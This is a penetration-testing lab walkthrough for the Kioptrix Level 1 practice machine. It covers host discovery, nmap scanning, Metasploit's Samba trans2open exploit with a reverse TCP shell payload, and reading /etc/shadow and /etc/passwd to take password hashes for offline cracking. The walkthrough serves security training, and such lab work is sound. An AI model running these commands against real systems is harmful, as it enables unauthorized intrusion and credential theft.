# Kioptrix Level 1 - RCE Walkthrough

## Objective

To gain root-level access to a target system (Kioptrix Level 1) by identifying vulnerabilities, exploiting misconfigurations, and performing post-exploitation analysis.

## Situation

The target system is discovered on a local network and suspected to be vulnerable due to outdated services. The goal is to enumerate the system, identify exploitable services, and leverage known vulnerabilities to achieve full system compromise.

## Task

- Identify the compromised system on the network
- Enumerate open ports and running services
- Research and exploit known vulnerabilities
- Gain root access to the system
- Perform post-exploitation activities such as credential extraction

## Action

### Stage 1: Identifying All Possible Exploits

#### Network Discovery

The system was identified using a network discovery scan to locate active hosts.

```bash
sudo netdiscover -P -r <IP>
```

#### Port and Service Enumeration

A full port scan was conducted to identify exposed services and potential attack vectors.

```bash
sudo nmap -A -T4 -p- <Target_IP>
```

**Findings:**
- Port 22: SSH
- Port 80: Apache 1.3 file server
- Port 139: Samba
- Port 443: OpenSSL

### Stage 2: Exploiting Identified Vulnerabilities

#### Samba Version Identification

Samba services were targeted due to their known history of critical vulnerabilities.

```bash
msfconsole
search smb_version
```

**Finding:**
- Samba version 2.2.1a identified

#### Exploit Research

Public exploit databases were queried to locate relevant exploits for the identified Samba version.

```bash
searchsploit samba 2.2
```

**Selected Exploit:**
- `exploit/linux/samba/trans2open`

#### Reverse Shell Setup and Execution

A reverse TCP shell payload was configured to establish a connection back to the attacker.

```bash
use exploit/linux/samba/trans2open
set rhosts <Target_IP>
set payload linux/x86/shell_reverse_tcp
run
```

### Stage 3: Gaining Root Access

#### Enumeration and Privilege Verification

Once shell access was established, system enumeration was performed to verify privilege level.

```bash
whoami
id
sudo -l
```

**Finding:**
- Root-level access obtained, allowing unrestricted control over system resources.

#### Post-Exploitation: Credential Extraction

Sensitive system files were accessed to extract user credentials and password hashes for further analysis.

```bash
cat /etc/shadow
cat /etc/passwd
```

## Result

- Successfully identified and exploited a vulnerable Samba service
- Gained full root access to the target system
- Extracted credential data for offline password attacks
- Demonstrated the impact of outdated services and poor patch management

This assessment highlights the critical importance of maintaining updated services and securing network-exposed systems against known exploits.

## References

- Kioptrix Level 1 Walkthrough – Apache mod_ssl Privilege Escalation
- How to Use a Reverse Shell in Metasploit
- OpenLuck Exploit
